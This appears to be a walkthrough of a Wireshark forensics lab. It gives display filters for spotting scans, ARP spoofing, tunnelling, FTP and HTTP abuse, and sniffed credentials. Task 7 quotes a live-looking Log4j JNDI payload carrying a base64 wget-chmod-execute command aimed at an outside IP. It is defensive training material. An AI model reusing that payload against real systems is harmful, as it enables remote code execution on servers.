### Task 2: Nmap Scans
**Q1: What is the total number of the "TCP Connect" scans?**
1. Use the given "~/Desktop/exercise-pcaps/nmap/Exercise.pcapng"
2. Use the query: *tcp.flags.syn==1 and tcp.flags.ack ==0 and tcp.window_size > 1024*\

**Q2: Which scan type is used to scan the TCP port 80?**
1. Relies on the three-way handshake (needs to finish the handshake process).
2. Usually conducted with nmap -sT command.
3. Used by non-privileged users (only option for a non-root user).
4. Usually has a windows size larger than 1024 bytes as the request expects some data due to the nature of the protocol.\

**Q3: How many "UDP close port" messages are there?**
1. Use filter: *icmp.type==3 and icmp.code==3* \
   
**Q4: Which UDP port in the 55-70 port range is open?**
1. Filter: *udp.dstport in {55..70}*
2. Analyze the wireshark notice that only one port that are not currently in use.


### Task 3: ARP Poisoning and MiTM
Use the “Desktop/exercise-pcaps/arp/Exercise.pcapng” file.\
**Q1: What is the number of ARP requests crafted by the attacker?**
1. Identify who the attacker was.
2. Filter: *arp.duplicate-address-detected or arp.duplicate-address-frame*
3. We have identified that the attacker has a mac address of “00:0c:29:e2:18:b4"
4. Let’s now craft a query to filter all ARP requests from the MAC address of the attacker.
5. Filter: *arp.opcode == 1 and arp.src.hw_mac == 00:0c:29:e2:18:b4*\

**Q2: What is the number of HTTP packets received by the attacker?**
1. We will modify the query to filter all http packets received by the attacker.
2. Filter: *http and eth.addr == 00:0c:29:e2:18:b4*
3. If we use the IP address of the attacker, no packets will be displayed. However, if we use the spoofed address, we will see some packets.\

**Q3: What is the number of sniffed username&password entries?**
1. We first need to identify the login points or URL for authentication.
2. Filter: *http and eth.addr == 00:0c:29:e2:18:b4*
3. We see that the attacker sent a “GET” request to a login page. In the packet details under HTTP, we see the host name hosting the login page. We will apply that as filter.
4. We will modify the query to filter only “POST” request. We get ten packets.
5. Go through all the packets, and some will contain credentials in the Packet details under the HTML Form URL endoded section.
6. I realized soon after I answered the last two questions below that we can modify the filter used to matched any value in that field, excluding empty strings.
7. Filter: *urlencoded-form matches ".+"*\

**Q4: What is the password of the "Client986"?**
1. From the previous packet, we know that data was captured in the HTML Form URL Encoded section. The Display Filter Expression will help us create a filter that is acceptable to wireshark.
2. Filter: *urlencoded-form matches "client986"*\

**Q5: What is the comment provided by the "Client354"?**
1. Same concept as the previous question. Any comments in the hostname might have been captured.
2. Filter: *urlencode-form matches "client354"*\


### Task 4: Identifying Hosts: DHCP, NetBIOS and Kerberos
Use the “Desktop/exercise-pcaps/dhcp-netbios-kerberos/dhcp-netbios.pcap” file.\

**Q1: What is the MAC address of the host “Galaxy A30”?**
1. Filter: **dhcp.option.hostname contains "A30"\

**Q2: How many NetBIOS registration requests does the “LIVALJM” workstation have?**
1. Let’s create a query using the Display Filter Expression.
2. The first one is building an NBNS registration request filter,
3. Second one is filtering NBNS names that match only the workstation “LIVALJM”.\

**Q3: Which host requested the IP address “172.16.13.85”?**
1. Filter: *dhcp.option.dhcp == 3 && dhcp.option.requested_ip_address == 172.16.13.85*
2. If the Host Name column is not diplayed as a column, go to the Packet List and right-click to add column for the host name. Otherwise, search for the host name within the DHCP Packet details pane.\

**Q4: Use the “Desktop/exercise-pcaps/dhcp-netbios-kerberos/kerberos.pcap” file.
What is the IP address of the user “u5”? (Enter the address in defanged format.)**
1. Filter: *kerberos.CNameString contains "u5"*
2. Defang the IP address using cyberchef.\

**Q5: What is the MAC address of the host “Galaxy A30”?**
1. Filter: *kerberos.CNameString contains "$"*
2. Values that end with “$” are hostnames, and the ones without it are usernames.\

### Task 5: Tunneling Traffic: DNS and ICMP
Use the “Desktop/exercise-pcaps/dns-icmp/icmp-tunnel.pcap” file.
Investigate the anomalous packets.\

**Q1: Which protocol is used in ICMP tunnelling?**
1. Filter: *data.len > 64 and icmp*
2. The result does not have enough data for us to analyze. So we will modify the query to include the protocols commonly used for data exfiltration such as SSH, FTP, TCP, and HTTP.
3. Filter: *(data.len > 64) and (icmp contains "ssh" or icmp contains "ftp" or icmp contains "tcp" or icmp contains "http")*
4. We got three results. Inpect one of the packets and focus on the packet bytes pane.
5. The strings on the right-side are commonly associated with SSH protocol negotiation, encryption algorithms, and authentication methods.\

Use the “Desktop/exercise-pcaps/dns-icmp/dns.pcap” file.
Investigate the anomalous packets. 
**Q2: What is the suspicious main domain address that receives anomalous DNS queries? (Enter the address in defanged format.)**
1. Filter: *dns.qry.name.len > 15 and !mdns*
2. We got over 30,000 packets. Imagine going over each one individually
3. I modified the query and increased the query name length to 40 to look for DNS names with particularly long lngths, which is highly suspicious for a normal DNS name.
4. Filter: *dns.qry.name.len > 40 and !mdns*
5. We can also use the following query or modify it if we are looking for a specific top-level domain such as “.com”
6. Filter: *dns.qry.name.len > 40 and !mdns && dns.qry.name contains ".com"*\


### Task 6: Cleartext Protocol Analysis: FTP
Use the “Desktop/exercise-pcaps/ftp/ftp.pcap” file.
**Q1: How many incorrect login attempts are there?**
1. Filter: *ftp.response.code == 530*\

**Q2: What is the size of the file accessed by the “ftp” account?**
1. Filter: *ftp.response.code == 213*
2. The ftp.response.code of 213 provides information about the status or size of a downloaded file. The “arg” value contains the readable strings that include file size in bytes.\

**Q3: The adversary uploaded a document to the FTP server. What is the filename?**
1. Filter: *ftp.request.command == "RETR"*
2. The FTP command “RETR” is used to retrieve (or download) files or documents from the FTP server to our local system.
3. Not sure if the question meant to ask about uploading documents to the FTP server because the ftp command for that is “STOR” and the uploaded file was different.\

**Q4: The adversary tried to assign special flags to change the executing permissions of the uploaded file. What is the command used by the adversary?**
1. Filter: *ftp contains "CHMOD"*
2. “CHMOD” is a terminal command used for modifying file permissions using numeric or symbolic representation.\

### Task 7: Cleartext Protocol Analysis: HTTP
Use the “Desktop/exercise-pcaps/http/user-agent.cap” file.
**Q1: Investigate the user agents. What is the number of anomalous “user-agent” types?**
1. Filter: **http.user agent
2. Filter packets with HTTP user-agent. Select one of the packets and apply the “User-Agent” info as a column. We have to go through each of the “User-Agent” columns and idenify the legitimate and elligitimate ones.
3. The hint actually gave us the first user-agent.
   a. Mozilla/5.0 (Windows; U; Windows NT 6.4; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.237 Safari/534.10
   b. Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
   c. Wfuzz/2.4
   d. sqlmap/1.4#stable (http://sqlmap.org)
   e. ${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}
   f. Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0/ \


**Q2: What is the packet number with a subtle spelling difference in the user agent field?**
1. Go through the user agent then we will find the spelling difference indicate typosquatting.\

**Q3: Use the “Desktop/exercise-pcaps/http/http.pcapng” file.
Locate the “Log4j” attack starting phase. What is the packet number?**
1. Filter: * (http.user_agent contains "$") or (http.user_agent contains "==")*
2. Copy the value of the User-Agent then decode it from base 64 using cyberchef.
3. This is the attack starting phase as seen from the decoded command. The command “wget” would retreive the bash script “lh.sh” from the hosting address, then change the file’s permission to executable, then eventually executing the malicious file.

**Q4: Locate the “Log4j” attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude “{}”.)**
1. This question can be solved with above solution.\


### Task 8: Encrypted Protocol Analysis: Decrypting HTTPS
Use the “Desktop/exercise-pcaps/https/Exercise.pcap” file.

**Q1: What is the frame number of the “Client Hello” message sent to “accounts.google.com”?**
1. Filter: *(http.request or tls.handshake.type == 1) and !(ssdp)*
2. “tls.handshake.type == 1” filters TLS requests sent by a client to a server. \

**Q2: Decrypt the traffic with the “KeysLogFile.txt” file. What is the number of HTTP2 packets?**
1. Adding the key log file: “Edit → Preferences → Protocols → TLS” menu. Then filter only http2 packets. \

**Q3: Go to Frame 322. What is the authority header of the HTTP2 packet? (Enter the address in defanged format.)**
1. Press ctrl+g and go to packet 322.
2. In the packet details pane, we see the header authority. Defang the address in cyberchef. \

**Q4: Investigate the decrypted packets and find the flag! What is the flag?**
1. In the export HTTP object list window, there are two files, and one of which is kind of suspicious. So let’s go to the packet number and see what it is.
2. The flag can be seen in the Line-based text data section of the packet details pane. \

### Task 9 Bonus: Hunt Cleartext Credentials
Use the “Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap” file.
**Q1: What is the packet number of the credentials using “HTTP Basic Auth”?**
1. Tools --> Credentials

**What is the packet number where “empty password” was submitted?**
1. Tools --> Credentials
2. If we click on the packet number in the credentials window, wireshark directs us to the packet.
3. Browse through the packets. Packet 170 has no value in the Request arg.
4. Another way to look for empty credentials submission for FTP packets is to select one of the packets where authentication is being requested. Select the “Request command: PASS” from the packet details, then left-click it and drag all the way to the display filter, or simply by right-clicking and applying it as a display filter.
5. The result will display all ftp packets that requested for a “PASS” command in the authentication.\


### Task 10: Bonus: Actionable Results
Use the “Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap” file.
**Q1:Select packet number 99. Create a rule for “IPFirewall (ipfw)”. What is the rule for “denying source IPv4 address”?**
1. Create firewall rules by using “Tools → Firewall ACL Rules”
2. Change the rules for “IPFirewall(ipfw)”

**Q2: Select packet number 231. Create “IPFirewall” rules. What is the rule for “allowing destination MAC address”?**
1. Unselect Deny.








